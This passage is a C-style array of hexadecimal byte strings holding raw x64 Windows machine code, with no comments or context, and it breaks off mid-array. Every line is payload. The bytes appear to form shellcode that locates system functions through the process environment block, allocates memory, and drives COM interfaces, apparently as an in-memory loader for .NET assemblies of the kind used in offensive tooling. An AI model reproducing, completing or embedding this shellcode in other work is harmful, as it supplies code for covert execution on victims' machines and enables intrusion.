"\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83"
"\xec\x20\x65\x48\x8b\x04\x25\x30\x00\x00\x00\x45\x33\xdb\x49\x8b"
"\xf1\x4d\x8b\xf0\x48\x8b\xea\x48\x8b\xf9\x4c\x8b\x50\x60\x49\x8b"
"\x42\x18\x48\x8b\x58\x10\x4c\x39\x5b\x30\x74\x2e\x4d\x85\xdb\x75"
"\x4a\x48\x8b\x53\x30\x48\x3b\xd5\x74\x11\x45\x33\xc9\x4c\x8b\xc6"
"\x48\x8b\xcf\xe8\x25\x21\x00\x00\x4c\x8b\xd8\x48\x8b\x1b\x48\x83"
"\x7b\x30\x00\x75\xd7\x4d\x85\xdb\x75\x21\x49\x8b\xd6\x48\x8b\xcf"
"\xe8\x20\x20\x00\x00\x48\x85\xc0\x74\x0e\x48\x8b\xd6\x48\x8b\xc8"
"\xff\x57\x38\x4c\x8b\xd8\xeb\x03\x45\x33\xdb\x48\x8b\x5c\x24\x30"
"\x49\x8b\xc3\x48\x8b\x6c\x24\x38\x48\x8b\x74\x24\x40\x48\x8b\x7c"
"\x24\x48\x48\x83\xc4\x20\x41\x5e\xc3\x40\x53\x48\x83\xec\x20\x48"
"\x8b\x4a\x30\x48\x8b\xda\x48\x85\xc9\x74\x0b\x48\x8b\x01\xff\x50"
"\x10\x48\x83\x63\x30\x00\x48\x8b\x4b\x38\x48\x85\xc9\x74\x0b\x48"
"\x8b\x01\xff\x50\x10\x48\x83\x63\x38\x00\x48\x8b\x4b\x28\x48\x85"
"\xc9\x74\x0b\x48\x8b\x01\xff\x50\x10\x48\x83\x63\x28\x00\x48\x8b"
"\x4b\x10\x48\x85\xc9\x74\x26\x48\x8b\x01\x48\x8b\x53\x20\xff\x90"
"\xa0\x00\x00\x00\x48\x8b\x4b\x10\x48\x8b\x01\xff\x50\x58\x48\x8b"
"\x4b\x10\x48\x8b\x01\xff\x50\x10\x48\x83\x63\x10\x00\x48\x8b\x4b"
"\x20\x48\x85\xc9\x74\x0b\x48\x8b\x01\xff\x50\x10\x48\x83\x63\x20"
"\x00\x48\x8b\x4b\x18\x48\x85\xc9\x74\x0b\x48\x8b\x01\xff\x50\x10"
"\x48\x83\x63\x18\x00\x48\x8b\x4b\x08\x48\x85\xc9\x74\x0b\x48\x8b"
"\x01\xff\x50\x10\x48\x83\x63\x08\x00\x48\x8b\x0b\x48\x85\xc9\x74"
"\x0a\x48\x8b\x01\xff\x50\x10\x48\x83\x23\x00\x48\x83\xc4\x20\x5b"
"\xc3\xf0\xff\x41\x20\x8b\x41\x20\xc3\x48\x8b\x49\x10\x45\x8b\xd1"
"\x4c\x8b\x4c\x24\x30\x49\x8b\xd0\x45\x8b\xc2\x48\x8b\x01\x48\xff"
"\x60\x50\xcc\xcc\xcc\x48\x89\x5c\x24\x08\x57\x48\x83\xec\x20\x49"
"\x8b\xd9\x48\x8b\xf9\x4d\x85\xc9\x75\x07\xb8\x03\x40\x00\x80\xeb"
"\x13\x48\x8b\x49\x10\x48\x8b\x01\xff\x50\x08\x48\x8b\x47\x10\x48"
"\x89\x03\x33\xc0\x48\x8b\x5c\x24\x30\x48\x83\xc4\x20\x5f\xc3\xcc"
"\xcc\x48\x85\xd2\x75\x06\xb8\x03\x40\x00\x80\xc3\xc7\x02\x01\x00"
"\x00\x00\x33\xc0\xc3\x48\x83\xec\x48\x48\x8b\x84\x24\x90\x00\x00"
"\x00\x4c\x8b\xd9\x48\x8b\x49\x10\x44\x8b\xc2\x44\x0f\xb7\x4c\x24"
"\x70\x49\x8b\xd3\x48\x89\x44\x24\x38\x48\x8b\x84\x24\x88\x00\x00"
"\x00\x4c\x8b\x11\x48\x89\x44\x24\x30\x48\x8b\x84\x24\x80\x00\x00"
"\x00\x48\x89\x44\x24\x28\x48\x8b\x44\x24\x78\x48\x89\x44\x24\x20"
"\x41\xff\x52\x58\x48\x83\xc4\x48\xc3\x48\x89\x5c\x24\x08\x48\x89"
"\x74\x24\x10\x57\x48\x81\xec\x40\x02\x00\x00\x48\x8b\x02\x48\x8b"
"\xf9\x48\x8d\x0d\x31\x02\x00\x00\x48\x8b\xda\x48\x89\x08\x48\x8d"
"\x0d\x0c\xff\xff\xff\x48\x8b\x02\x48\x89\x48\x08\x48\x8d\x0d\xa6"
"\x02\x00\x00\x48\x8b\x02\x48\x89\x48\x10\x48\x8d\x0d\x50\xff\xff"
"\xff\x48\x8b\x02\x48\x89\x48\x18\x48\x8d\x0d\x06\xff\xff\xff\x48"
"\x8b\x02\x48\x89\x48\x20\x48\x8d\x0d\xdc\xfe\xff\xff\x48\x8b\x02"
"\x48\x89\x48\x28\x48\x8d\x0d\x3a\xff\xff\xff\x48\x8b\x02\x48\x89"
"\x48\x30\x48\x8d\x0d\x90\xf3\xff\xff\x48\x8b\x02\x48\x89\x48\x38"
"\x48\x8d\x0d\x16\xf3\xff\xff\x48\x8b\x02\x48\x89\x48\x40\x48\x8d"
"\x0d\x08\xf3\xff\xff\x48\x8b\x02\x48\x89\x48\x48\x48\x8d\x0d\xfa"
"\xf2\xff\xff\x48\x8b\x02\x48\x89\x48\x50\x48\x8d\x0d\xec\xf2\xff"
"\xff\x48\x8b\x02\x48\x89\x48\x58\x48\x8d\x0d\xde\xf2\xff\xff\x48"
"\x8b\x02\x48\x89\x48\x60\x48\x8d\x0d\xec\x01\x00\x00\x48\x8b\x02"
"\x48\x89\x48\x68\x48\x8d\x0d\xc2\xf2\xff\xff\x48\x8b\x02\x48\x89"
"\x48\x70\x48\x8d\x0d\xb4\xf2\xff\xff\x48\x8b\x02\x48\x89\x48\x78"
"\x48\x8d\x0d\xa6\xf2\xff\xff\x48\x8b\x02\x48\x89\x88\x80\x00\x00"
"\x00\x48\x8d\x0d\x95\xf2\xff\xff\x48\x8b\x02\x48\x89\x88\x88\x00"
"\x00\x00\x48\x8d\x0d\x84\xf2\xff\xff\x48\x8b\x02\x48\x89\x88\x90"
"\x00\x00\x00\x48\x8d\x0d\x73\xf2\xff\xff\x48\x8b\x02\x48\x89\x88"
"\x98\x00\x00\x00\x48\x8d\x0d\x62\xf2\xff\xff\x48\x8b\x02\x48\x89"
"\x88\xa0\x00\x00\x00\x48\x8d\x0d\x51\xf2\xff\xff\x48\x8b\x02\x48"
"\x89\x88\xa8\x00\x00\x00\x48\x8d\x0d\x40\xf2\xff\xff\x48\x8b\x02"
"\x48\x89\x88\xb0\x00\x00\x00\x48\x8d\x0d\x2f\xf2\xff\xff\x48\x8b"
"\x02\x48\x89\x88\xb8\x00\x00\x00\x48\x8d\x0d\x1e\xf2\xff\xff\x48"
"\x8b\x02\x48\x89\x88\xc0\x00\x00\x00\x48\x8d\x0d\x55\x01\x00\x00"
"\x48\x8b\x02\x48\x89\x88\xc8\x00\x00\x00\x48\x8b\x02\x48\x8d\x0d"
"\xf9\xf1\xff\xff\xc7\x44\x24\x28\x00\x01\x00\x00\x48\x89\x88\xd0"
"\x00\x00\x00\x4c\x8d\x87\x19\x06\x00\x00\x48\x8b\x02\x48\x8d\x0d"
"\xd9\xf1\xff\xff\x41\x83\xc9\xff\x48\x89\x88\xd8\x00\x00\x00\x48"
"\x8d\x0d\xc7\xf1\xff\xff\x48\x8b\x02\x48\x89\x88\xe0\x00\x00\x00"
"\x48\x8d\x0d\xb6\xf1\xff\xff\x48\x8b\x02\x48\x89\x88\xe8\x00\x00"
"\x00\x48\x8d\x44\x24\x30\x83\x62\x20\x00\x33\xc9\x48\x89\x7a\x28"
"\x33\xd2\x48\x89\x44\x24\x20\xff\x57\x70\x48\x8d\x53\x08\x48\x8d"
"\x4c\x24\x30\xff\x97\x40\x01\x00\x00\x85\xc0\x75\x15\x48\x8b\x4b"
"\x08\x4c\x8d\x43\x10\x48\x8d\x97\xc0\x08\x00\x00\x48\x8b\x01\xff"
"\x50\x30\x4c\x8d\x9c\x24\x40\x02\x00\x00\x49\x8b\x5b\x10\x49\x8b"
"\x73\x18\x49\x8b\xe3\x5f\xc3\xcc\xcc\x4c\x8b\xc9\x4d\x85\xc0\x75"
"\x06\xb8\x03\x40\x00\x80\xc3\x48\x8b\x49\x28\x48\x8b\x81\x30\x08"
"\x00\x00\x48\x3b\x02\x75\x0d\x48\x8b\x81\x38\x08\x00\x00\x48\x3b"
"\x42\x08\x74\x32\x48\x8b\x81\x40\x08\x00\x00\x48\x3b\x02\x75\x0d"
"\x48\x8b\x81\x48\x08\x00\x00\x48\x3b\x42\x08\x74\x19\x48\x8b\x81"
"\xc0\x08\x00\x00\x48\x3b\x02\x75\x13\x48\x8b\x81\xc8\x08\x00\x00"
"\x48\x3b\x42\x08\x75\x06\x4d\x89\x08\x33\xc0\xc3\x49\x83\x20\x00"
"\xb8\x02\x40\x00\x80\xc3\xcc\xcc\xcc\x48\x83\xec\x28\x48\x8b\x49"
"\x18\x45\x33\xc9\x45\x33\xc0\xba\xfd\xff\xff\xff\x48\x8b\x01\xff"
"\x50\x70\x33\xc0\x48\x83\xc4\x28\xc3\x83\xc8\xff\xf0\x0f\xc1\x41"
"\x20\xff\xc8\xc3\xcc\x48\x83\xec\x28\x48\x8b\x41\x28\x8b\xca\xff"
"\x50\x68\x33\xc0\x48\x83\xc4\x28\xc3\x48\x89\x5c\x24\x08\x57\x48"
"\x81\xec\xa0\x00\x00\x00\x48\x8b\xfa\x48\x8d\x99\x70\x04\x00\x00"
"\x8a\x03\x45\x33\xc9\x45\x33\xc0\x84\xc0\x74\x57\x48\x8d\x54\x24"
"\x20\x48\x8b\xcb\x48\x2b\xd3\x3c\x3b\x74\x1b\x49\x81\xf8\x80\x00"
"\x00\x00\x7d\x12\x88\x04\x0a\x41\xff\xc1\x48\xff\xc1\x49\xff\xc0"
"\x8a\x01\x84\xc0\x75\xe1\x4d\x85\xc0\x74\x28\x41\x8d\x49\x01\x42"
"\xc6\x44\x04\x20\x00\x48\x63\xd1\x48\x8d\x4c\x24\x20\x48\x03\xda"
"\x48\x8b\xd7\xe8\x99\x23\x00\x00\x85\xc0\x75\xa4\xb8\x01\x00\x00"
"\x00\xeb\x02\x33\xc0\x48\x8b\x9c\x24\xb0\x00\x00\x00\x48\x81\xc4"
"\xa0\x00\x00\x00\x5f\xc3\xcc\xcc\xcc\x40\x53\x48\x83\xec\x50\x33"
"\xdb\x48\x8b\xc2\x4c\x8b\xc9\x48\x85\xd2\x74\x37\x44\x8d\x43\x30"
"\x48\x8b\xc8\x48\x8d\x54\x24\x20\x41\xff\x51\x58\x83\xf8\x30\x75"
"\x22\x81\x7c\x24\x40\x00\x10\x00\x00\x75\x14\x81\x7c\x24\x48\x00"
"\x00\x02\x00\x75\x0a\x83\x7c\x24\x44\x04\x75\x03\x8d\x58\xd1\x8b"
"\xc3\xeb\x02\x33\xc0\x48\x83\xc4\x50\x5b\xc3\xcc\xcc\x48\x89\x5c"
"\x24\x10\x48\x89\x6c\x24\x18\x56\x57\x41\x54\x41\x56\x41\x57\x48"
"\x81\xec\x30\x02\x00\x00\x4c\x8b\x89\xa0\x01\x00\x00\x33\xc0\x45"
"\x33\xe4\x49\x8b\xf0\x48\x8b\xea\x48\x8b\xf9\x41\xbf\x00\x01\x00"
"\x00\x4d\x85\xc9\x0f\x84\x9a\x00\x00\x00\x48\x8d\x91\x60\x08\x00"
"\x00\x48\x81\xc1\x50\x08\x00\x00\x41\xff\xd1\x85\xc0\x0f\x88\xba"
"\x00\x00\x00\x48\x8d\x44\x24\x30\x44\x89\x7c\x24\x28\x4c\x8d\x45"
"\x0c\x48\x89\x44\x24\x20\x41\x83\xc9\xff\x33\xd2\x33\xc9\xff\x57"
"\x70\x48\x8b\x0e\x48\x8d\x5e\x08\x4c\x8d\x87\x70\x08\x00\x00\x4c"
"\x8b\xcb\x48\x8d\x54\x24\x30\x48\x8b\x01\xff\x50\x18\x85\xc0\x78"
"\x3c\x48\x8b\x0b\x48\x8d\x94\x24\x60\x02\x00\x00\x48\x8b\x01\xff"
"\x50\x50\x85\xc0\x78\x37\x44\x39\xa4\x24\x60\x02\x00\x00\x74\x20"
"\x48\x8b\x0b\x4c\x8d\x4e\x10\x4c\x8d\x87\x90\x08\x00\x00\x48\x8d"
"\x97\x80\x08\x00\x00\x48\x8b\x01\xff\x50\x48\xeb\x03\x4c\x21\x23"
"\x85\xc0\x78\x09\x4c\x39\xa7\xa0\x01\x00\x00\x75\x21\x48\x8d\x46"
"\x10\x33\xd2\x4c\x8d\x8f\x90\x08\x00\x00\x48\x89\x44\x24\x20\x4c"
"\x8d\x87\x80\x08\x00\x00\x33\xc9\xff\x97\x98\x01\x00\x00\x85\xc0"
"\x79\x10\x4c\x21\x66\x10\x33\xc0\xe9\x4b\x01\x00\x00\x4c\x21\x26"
"\xeb\xcb\x48\x8b\x4e\x10\x48\x8b\x01\xff\x50\x50\x85\xc0\x0f\x88"
"\x31\x01\x00\x00\x4c\x8d\x85\x0c\x01\x00\x00\x4c\x8d\x76\x18\x45"
"\x38\x20\x75\x12\x48\x8b\x4e\x10\x49\x8b\xd6\x48\x8b\x01\xff\x50"
"\x68\x44\x8b\xf8\xeb\x48\x48\x8d\x44\x24\x30\x44\x89\x7c\x24\x28"
"\x41\x83\xc9\xff\x48\x89\x44\x24\x20\x33\xd2\x33\xc9\xff\x57\x70"
"\x48\x8d\x4c\x24\x30\xff\x97\x30\x01\x00\x00\x48\x8b\x4e\x10\x4d"
"\x8b\xce\x45\x33\xc0\x48\x8b\xd0\x48\x8b\xd8\x4c\x8b\x11\x41\xff"
"\x52\x60\x48\x8b\xcb\x44\x8b\xf8\xff\x97\x38\x01\x00\x00\x45\x85"
"\xff\x0f\x88\xbe\x00\x00\x00\x49\x8b\x0e\x48\x8d\x97\xa0\x08\x00"
"\x00\x4c\x8d\x76\x20\x4d\x8b\xc6\x48\x8b\x01\xff\x10\x85\xc0\x0f"
"\x88\xa0\x00\x00\x00\x8b\x85\x24\x05\x00\x00\x4c\x8d\x84\x24\x78"
"\x02\x00\x00\x44\x21\xa4\x24\x7c\x02\x00\x00\xb9\x11\x00\x00\x00"
"\x89\x84\x24\x78\x02\x00\x00\x8d\x51\xf0\xff\x97\x00\x01\x00\x00"
"\x48\x8b\xd8\x48\x85\xc0\x74\x6d\x4c\x8b\x40\x10\x33\xd2\x39\x95"
"\x24\x05\x00\x00\x76\x19\x8a\x84\x2a\x28\x05\x00\x00\x41\x88\x04"
"\x10\xff\xc2\x3b\x95\x24\x05\x00\x00\x72\xeb\x4c\x8d\x76\x20\x49"
"\x8b\x0e\x4c\x8d\x46\x28\x48\x8b\xd3\x48\x8b\x01\xff\x90\x68\x01"
"\x00\x00\x85\xc0\x48\x8b\x43\x10\x41\x0f\x94\xc4\x33\xd2\x39\x95"
"\x24\x05\x00\x00\x76\x16\xc6\x84\x2a\x28\x05\x00\x00\x00\xc6\x04"
"\x02\x00\xff\xc2\x3b\x95\x24\x05\x00\x00\x72\xea\x48\x8b\xcb\xff"
"\x97\x18\x01\x00\x00\x41\x8b\xc4\x4c\x8d\x9c\x24\x30\x02\x00\x00"
"\x49\x8b\x5b\x38\x49\x8b\x6b\x40\x49\x8b\xe3\x41\x5f\x41\x5e\x41"
"\x5c\x5f\x5e\xc3\xcc\x48\x89\x5c\x24\x10\x48\x89\x6c\x24\x18\x56"
"\x57\x41\x55\x41\x56\x41\x57\x48\x81\xec\x80\x01\x00\x00\x4c\x8b"
"\x41\x28\x48\x8b\xd9\x48\x8b\x51\x48\xe8\x67\x1a\x00\x00\x4c\x8b"
"\x43\x28\x48\x8b\xcb\x48\x8b\x53\x50\x4c\x8b\xf8\xe8\x54\x1a\x00"
"\x00\x4c\x8b\x43\x28\x48\x8b\xcb\x48\x8b\x93\xe8\x01\x00\x00\x4c"
"\x8b\xf0\xe8\x3e\x1a\x00\x00\x48\x8b\xe8\x4d\x85\xff\x74\x30\x4d"
"\x85\xf6\x74\x2b\x48\x85\xc0\x74\x26\x8b\x13\x33\xc9\x41\xb8\x00"
"\x30\x00\x00\x44\x8d\x49\x04\x41\xff\xd7\x48\x8b\xf8\x48\x85\xc0"
"\x75\x2c\x83\xbb\x30\x02\x00\x00\x02\x75\x04\x33\xc9\xff\xd5\x83"
"\xc8\xff\x4c\x8d\x9c\x24\x80\x01\x00\x00\x49\x8b\x5b\x38\x49\x8b"
"\x6b\x40\x49\x8b\xe3\x41\x5f\x41\x5e\x41\x5d\x5f\x5e\xc3\x44\x8b"
"\x03\x48\x8b\xd3\x48\x8b\xcf\xe8\xb9\x1f\x00\x00\x33\xd2\x48\x8d"
"\x4c\x24\x30\x44\x8d\x42\x40\xe8\xc9\x1f\x00\x00\x83\xbf\x34\x02"
"\x00\x00\x03\x41\xbd\x01\x00\x00\x00\x75\x3b\x44\x8b\x0f\x4c\x8d"
"\x87\x3c\x02\x00\x00\x41\x81\xe9\x3c\x02\x00\x00\x48\x8d\x57\x14"
"\x48\x8d\x4f\x04\xe8\x9c\x1b\x00\x00\x48\x8b\x57\x28\x48\x8d\x8f"
"\x2c\x0c\x00\x00\xe8\x00\x1a\x00\x00\x48\x3b\x87\x30\x0d\x00\x00"
"\x0f\x85\x4d\x02\x00\x00\x4c\x8b\x47\x28\x48\x8b\xcf\x48\x8b\x57"
"\x30\xe8\x6f\x19\x00\x00\x48\x89\x47\x30\x48\x85\xc0\x0f\x84\x5c"
"\xff\xff\xff\x48\x8d\x9f\x40\x02\x00\x00\x8a\x03\x33\xd2\x84\xc0"
"\x74\x3c\x33\xc9\x3c\x3b\x74\x18\x81\xfa\x04\x01\x00\x00\x73\x10"
"\x41\x03\xd5\x88\x44\x0c\x70\x8b\xca\x8a\x04\x1a\x84\xc0\x75\xe4"
"\x85\xd2\x74\x1a\x8d\x4a\x01\xc6\x44\x14\x70\x00\x48\x03\xd9\x48"
"\x8d\x54\x24\x70\x48\x8b\xcf\xe8\x89\x16\x00\x00\xeb\xbc\x41\x8b"
"\xf5\x44\x39\xaf\x3c\x02\x00\x00\x76\x35\x4c\x8b\x47\x28\x48\x8b"
"\xcf\x8b\xde\x48\x8b\x54\xdf\x30\xe8\xf8\x18\x00\x00\x48\x89\x44"
"\xdf\x30\x48\x85\xc0\x75\x0d\x48\x39\x87\xa0\x01\x00\x00\x0f\x85"
"\xaf\x01\x00\x00\x41\x03\xf5\x3b\xb7\x3c\x02\x00\x00\x72\xcb\x8b"
"\x87\x20\x09\x00\x00\x83\xf8\x02\x75\x19\x48\x8b\xcf\xe8\x3f\xef"
"\xff\xff\x85\xc0\x0f\x84\x89\x01\x00\x00\x48\x8b\x9f\x60\x0d\x00"
"\x00\xeb\x1d\x83\xf8\x03\x0f\x84\x77\x01\x00\x00\x48\x8d\x9f\x60"
"\x0d\x00\x00\x41\x3b\xc5\x74\x08\x48\x8b\x9c\x24\xb0\x01\x00\x00"
"\x44\x39\xaf\x70\x05\x00\x00\x74\x32\x48\x8b\xcf\xe8\x44\xed\xff"
"\xff\x85\xc0\x75\x0d\x83\xbf\x70\x05\x00\x00\x02\x0f\x84\x41\x01"
"\x00\x00\x48\x8b\xcf\xe8\x57\xee\xff\xff\x85\xc0\x75\x0d\x83\xbf"
"\x70\x05\x00\x00\x02\x0f\x84\x28\x01\x00\x00\x44\x39\x6b\x08\x0f"
"\x84\xae\x00\x00\x00\x8b\x93\x24\x05\x00\x00\x33\xc9\x48\x81\xc2"
"\x2f\x15\x00\x00\x41\xb8\x00\x30\x00\x00\x48\x81\xe2\x00\xf0\xff"
"\xff\x44\x8d\x49\x04\x41\xff\xd7\x48\x8b\xf0\x48\x85\xc0\x0f\x84"
"\xef\x00\x00\x00\x41\xb8\x30\x05\x00\x00\x48\x8b\xd3\x48\x8b\xc8"
"\xe8\xf0\x1d\x00\x00\x8b\x43\x08\x8d\x48\xfd\x41\x3b\xcd\x76\x1a"
"\x83\xf8\x02\x75\x5e\x48\x8d\x96\x28\x05\x00\x00\x48\x8d\x8b\x28"
"\x05\x00\x00\xe8\x51\x1b\x00\x00\xeb\x46\x0f\xb7\x4b\x08\x4c\x8d"
"\x8b\x28\x05\x00\x00\x44\x8b\x83\x24\x05\x00\x00\x48\x8d\x96\x28"
"\x05\x00\x00\x66\x41\x2b\xcd\xb8\x00\x01\x00\x00\x66\x0b\xc8\x48"
"\x8d\x84\x24\xb0\x01\x00\x00\x48\x89\x44\x24\x28\x8b\x83\x20\x05"
"\x00\x00\x89\x44\x24\x20\xff\x97\x00\x02\x00\x00\x85\xc0\x75\x73"
"\x48\x8b\xde\x8b\x0b\x8d\x41\xfd\x41\x3b\xc5\x76\x50\x8d\x41\xff"
"\x41\x3b\xc5\x76\x15\x8d\x41\xfb\x41\x3b\xc5\x77\x4b\x48\x8b\xd3"
"\x48\x8b\xcf\xe8\x95\x0f\x00\x00\xeb\x3e\x4c\x8d\x44\x24\x30\x48"
"\x8b\xd3\x48\x8b\xcf\xe8\x63\xfa\xff\xff\x85\xc0\x74\x10\x4c\x8d"
"\x44\x24\x30\x48\x8b\xd3\x48\x8b\xcf\xe8\x97\x00\x00\x00\x48\x8d"
"\x54\x24\x30\x48\x8b\xcf\xe8\xce\xf4\xff\xff\xeb\x0b\x48\x8b\xd3"
"\x48\x8b\xcf\xe8\xb5\x04\x00\x00\x83\xbf\x30\x02\x00\x00\x03\x75"
"\x02\xeb\xfe\x8b\x87\x20\x09\x00\x00\xbe\x00\xc0\x00\x00\x83\xe8"
"\x02\x41\x3b\xc5\x77\x31\x48\x8b\x8f\x60\x0d\x00\x00\x48\x85\xc9"
"\x74\x25\x44\x8b\x87\x58\x0d\x00\x00\x33\xd2\xe8\x05\x1d\x00\x00"
"\x48\x8b\x8f\x60\x0d\x00\x00\x44\x8b\xc6\x33\xd2\x41\xff\xd6\x48"
"\x83\xa7\x60\x0d\x00\x00\x00\x44\x8b\x07\x33\xd2\x8b\x9f\x30\x02"
"\x00\x00\x48\x8b\xcf\xe8\xdb\x1c\x00\x00\x44\x8b\xc6\x33\xd2\x48"
"\x8b\xcf\x41\xff\xd6\x83\xfb\x02\x75\x04\x33\xc9\xff\xd5\x33\xc0"
"\xe9\xbd\xfc\xff\xff\x48\x89\x5c\x24\x08\x55\x56\x57\x41\x54\x41"
"\x55\x41\x56\x41\x57\x48\x8d\xac\x24\xe0\xfd\xff\xff\x48\x81\xec"
"\x20\x03\x00\x00\x45\x33\xe4\x33\xc0\x83\x3a\x02\x0f\x57\xc0\x4d"
"\x8b\xf8\x4c\x89\x64\x24\x50\x4c\x8b\xf2\x48\x89\x45\x88\x45\x8d"
"\x6c\x24\x01\x66\x44\x89\xa5\x68\x02\x00\x00\x48\x8b\xd9\x41\x8b"
"\xf4\x0f\x11\x44\x24\x78\x0f\x85\xe9\x01\x00\x00\x49\x8b\x48\x28"
"\x49\x8d\x78\x38\x48\x8b\xd7\x48\x8b\x01\xff\x90\x80\x00\x00\x00"
"\x85\xc0\x0f\x88\xc5\x01\x00\x00\x48\x8b\x0f\x48\x8d\x54\x24\x50"
"\x48\x8b\x01\xff\x90\x90\x00\x00\x00\x85\xc0\x0f\x88\x8c\x03\x00"
"\x00\x48\x8b\x4c\x24\x50\x4c\x8d\x44\x24\x48\x41\x8b\xd5\xff\x93"
"\x20\x01\x00\x00\x48\x8b\x4c\x24\x50\x4c\x8d\x44\x24\x44\x41\x8b"
"\xd5\xff\x93\x28\x01\x00\x00\x8b\x44\x24\x44\x2b\x44\x24\x48\x41"
"\x03\xc5\x0f\x84\x1f\x01\x00\x00\x41\x8d\x4c\x24\x0c\x45\x8b\xc5"
"\x33\xd2\xff\x93\x08\x01\x00\x00\x4d\x8d\x86\x0c\x04\x00\x00\x33"
"\xd2\x48\x8b\xf0\x45\x38\x20\x0f\x84\x98\x00\x00\x00\x48\x8d\x45"
"\x10\xc7\x44\x24\x28\x00\x01\x00\x00\x41\x83\xc9\xff\x48\x89\x44"
"\x24\x20\x33\xc9\xff\x53\x70\x48\x8d\x54\x24\x40\x48\x8d\x4d\x10"
"\xff\x93\xf8\x00\x00\x00\x44\x8b\x44\x24\x40\xb9\x08\x20\x00\x00"
"\x66\x89\x4c\x24\x60\x33\xd2\x41\x8d\x4c\x24\x08\x48\x8b\xf8\xff"
"\x93\x08\x01\x00\x00\x48\x89\x44\x24\x68\x44\x89\xa5\x78\x02\x00"
"\x00\x44\x39\x64\x24\x40\x76\x37\x41\x8b\xcc\x48\x8b\x0c\xcf\xff"
"\x93\x30\x01\x00\x00\x48\x8b\x4c\x24\x68\x48\x8d\x95\x78\x02\x00"
"\x00\x4c\x8b\xc0\xff\x93\x10\x01\x00\x00\x8b\x8d\x78\x02\x00\x00"
"\x41\x03\xcd\x89\x8d\x78\x02\x00\x00\x3b\x4c\x24\x40\x72\xcc\x49"
"\x8d\x7f\x38\xeb\x46\xb9\x08\x20\x00\x00\x45\x8b\xc5\x66\x89\x4c"
"\x24\x60\xb9\x08\x00\x00\x00\xff\x93\x08\x01\x00\x00\x48\x8d\x8d"
"\x68\x02\x00\x00\x44\x89\xa5\x78\x02\x00\x00\x48\x89\x44\x24\x68"
"\xff\x93\x30\x01\x00\x00\x48\x8b\x4c\x24\x68\x48\x8d\x95\x78\x02"
"\x00\x00\x4c\x8b\xc0\xff\x93\x10\x01\x00\x00\x4c\x8d\x44\x24\x60"
"\x44\x89\xa5\x78\x02\x00\x00\x48\x8d\x95\x78\x02\x00\x00\x48\x8b"
"\xce\xff\x93\x10\x01\x00\x00\x48\x8b\x0f\x4c\x8d\x4d\xd8\xf2\x0f"
"\x10\x4d\x88\x48\x8d\x55\xa0\x66\x44\x89\x6c\x24\x78\x4c\x8b\xc6"
"\x4c\x89\x65\x80\x0f\x10\x44\x24\x78\x48\x8b\x01\xf2\x0f\x11\x4d"
"\xb0\x0f\x29\x45\xa0\xff\x90\x28\x01\x00\x00\x48\x85\xf6\x0f\x84"
"\xf9\x01\x00\x00\x48\x8b\x4c\x24\x68\xff\x93\x18\x01\x00\x00\x48"
"\x8b\xce\xff\x93\x18\x01\x00\x00\xe9\xe0\x01\x00\x00\x4c\x89\x27"
"\xe9\xd8\x01\x00\x00\x4c\x8d\x82\x0c\x02\x00\x00\x41\xbd\x00\x01"
"\x00\x00\x48\x8d\x45\x10\x44\x89\x6c\x24\x28\x83\xcf\xff\x48\x89"
"\x44\x24\x20\x44\x8b\xcf\x33\xd2\x33\xc9\xff\x53\x70\x48\x8d\x4d"
"\x10\xff\x93\x30\x01\x00\x00\x48\x89\x45\x90\x4c\x8b\xe0\x48\x85"
"\xc0\x0f\x84\x99\x01\x00\x00\x48\x8d\x45\x10\x44\x89\x6c\x24\x28"
"\x4d\x8d\x86\x0c\x03\x00\x00\x48\x89\x44\x24\x20\x44\x8b\xcf\x33"
"\xd2\x33\xc9\xff\x53\x70\x48\x8d\x4d\x10\xff\x93\x30\x01\x00\x00"
"\x48\x89\x44\x24\x58\x48\x85\xc0\x0f\x84\x50\x01\x00\x00\x49\x8b"
"\x4f\x28\x49\x8d\x77\x30\x4c\x8b\xc6\x49\x8b\xd4\x4c\x8b\x09\x41"
"\xff\x91\x88\x00\x00\x00\x44\x8b\xe0\x85\xc0\x0f\x88\x1b\x01\x00"
"\x00\x33\xff\x4d\x8d\x86\x0c\x04\x00\x00\x48\x8b\xce\x41\x38\x38"
"\x0f\x84\xac\x00\x00\x00\x48\x8d\x45\x10\x44\x89\x6c\x24\x28\x41"
"\x83\xc9\xff\x48\x89\x44\x24\x20\x33\xd2\x33\xc9\xff\x53\x70\x48"
"\x8d\x54\x24\x40\x48\x8d\x4d\x10\xff\x93\xf8\x00\x00\x00\x44\x8b"
"\x44\x24\x40\x8d\x4f\x0c\x33\xd2\x4c\x8b\xe8\xff\x93\x08\x01\x00"
"\x00\x48\x8b\xf8\x48\x8b\xce\x48\x85\xc0\x74\x66\x83\xa5\x78\x02"
"\x00\x00\x00\x83\x7c\x24\x40\x00\x76\x58\x33\xc0\x44\x8d\x70\x08"
"\x49\x8b\x4c\xc5\x00\xff\x93\x30\x01\x00\x00\x4c\x8d\x45\xc0\x66"
"\x44\x89\x75\xc0\x48\x8d\x95\x78\x02\x00\x00\x48\x89\x45\xc8\x48"
"\x8b\xcf\xff\x93\x10\x01\x00\x00\x44\x8b\xe0\x85\xc0\x79\x0b\x48"
"\x8b\xcf\xff\x93\x18\x01\x00\x00\x33\xff\x8b\x85\x78\x02\x00\x00"
"\xff\xc0\x89\x85\x78\x02\x00\x00\x3b\x44\x24\x40\x72\xb2\x49\x8d"
"\x4f\x30\x48\x8b\x74\x24\x58\x45\x85\xe4\x78\x55\x48\x8b\x09\x48"
"\x8d\x55\xf0\x48\x89\x54\x24\x30\x0f\x57\xc0\x48\x8d\x55\xa0\x0f"
"\x29\x45\xa0\xf2\x0f\x10\x45\x88\x45\x33\xc9\x48\x8b\x01\x41\xb8"
"\x18\x01\x00\x00\x48\x89\x7c\x24\x28\x48\x89\x54\x24\x20\x48\x8b"
"\xd6\xf2\x0f\x11\x45\xb0\xff\x90\xc8\x01\x00\x00\x48\x85\xff\x74"
"\x10\x48\x8b\xcf\xff\x93\x18\x01\x00\x00\xeb\x05\x48\x8b\x74\x24"
"\x58\x48\x8b\xce\xff\x93\x38\x01\x00\x00\x4c\x8b\x65\x90\x49\x8b"
"\xcc\xff\x93\x38\x01\x00\x00\x41\xbd\x01\x00\x00\x00\x41\x8b\xc5"
"\x48\x8b\x9c\x24\x60\x03\x00\x00\x48\x81\xc4\x20\x03\x00\x00\x41"
"\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\x5e\x5d\xc3\xcc\xcc\x48\x89\x54"
"\x24\x10\x55\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x8d"
